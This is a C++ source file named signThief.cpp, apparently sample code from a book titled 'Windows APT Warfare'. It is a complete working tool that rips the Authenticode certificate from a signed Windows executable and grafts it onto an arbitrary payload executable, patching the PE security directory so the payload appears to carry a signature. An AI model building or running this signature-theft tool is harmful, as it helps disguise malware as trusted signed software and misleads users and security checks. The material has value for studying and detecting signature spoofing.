/**
 * signThief.cpp
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <fstream>
#include <windows.h>
#pragma warning(disable : 4996)
BYTE *MapFileToMemory(LPCSTR filename, LONGLONG &filelen)
{
	FILE *fileptr;
	BYTE *buffer;

	fileptr = fopen(filename, "rb"); // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);	 // Jump to the end of the file
	filelen = ftell(fileptr);		 // Get the current byte offset in the file
	rewind(fileptr);				 // Jump back to the beginning of the file

	buffer = (BYTE *)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr);					   // Read in the entire file
	fclose(fileptr);									   // Close the file
	return buffer;
}

BYTE *rippedCert(const char *fromWhere, LONGLONG &certSize)
{
	LONGLONG signedPeDataLen = 0;
	BYTE *signedPeData = MapFileToMemory(fromWhere, signedPeDataLen);

	auto ntHdr = PIMAGE_NT_HEADERS(&signedPeData[PIMAGE_DOS_HEADER(signedPeData)->e_lfanew]);
	auto certInfo = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
	certSize = certInfo.Size;

	BYTE *certData = new BYTE[certInfo.Size];
	memcpy(certData, &signedPeData[certInfo.VirtualAddress], certInfo.Size);
	return certData;
}

int main(int argc, char **argv) {
	if (argc < 4) {
		auto fileName = strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0];
		printf("usage: %s [path/to/signed_pe] [path/to/payload] [path/to/output]\n", fileName);
		return 0;
	}
	// signature from where?
	LONGLONG certSize;
	BYTE *certData = rippedCert(argv[1], certSize);

	// payload data prepare.
	LONGLONG payloadSize = 0;
	BYTE *payloadPeData = MapFileToMemory(argv[2], payloadSize);

	// append signature to payload.
	BYTE *finalPeData = new BYTE[payloadSize + certSize];
	memcpy(finalPeData, payloadPeData, payloadSize);

	auto ntHdr = PIMAGE_NT_HEADERS(&finalPeData[PIMAGE_DOS_HEADER(finalPeData)->e_lfanew]);
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadSize;
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;
	memcpy(&finalPeData[payloadSize], certData, certSize);

	FILE *fp = fopen(argv[3], "wb");
	fwrite(finalPeData, payloadSize + certSize, 1, fp);
	puts("done.");
}
